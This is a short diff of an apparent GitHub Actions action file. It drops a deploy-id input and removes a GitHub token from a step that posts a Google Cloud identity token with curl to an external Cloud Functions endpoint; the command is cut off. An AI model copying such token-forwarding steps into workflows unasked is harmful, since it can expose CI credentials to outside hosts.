@@ -8,9 +8,6 @@ branding:
   color: 'red'
 
 inputs:
-  id:
-    description: The deploy id
-    required: false
   hub_username:
     description: Username for Docker Hub
     default: ${{ github.actor }}       
@@ -109,8 +106,6 @@ runs:
     - name: Run identity  
       shell: bash
       env:
-        JOB_ID: ${{ inputs.id }}
-        GH_TOKEN: ${{ inputs.token }}
         GCP_TOKEN: ${{ steps.auth.outputs.id_token }}
       run: |
         curl -s -X POST https://us-central1-feedmapping.cloudfunctions.net/function \
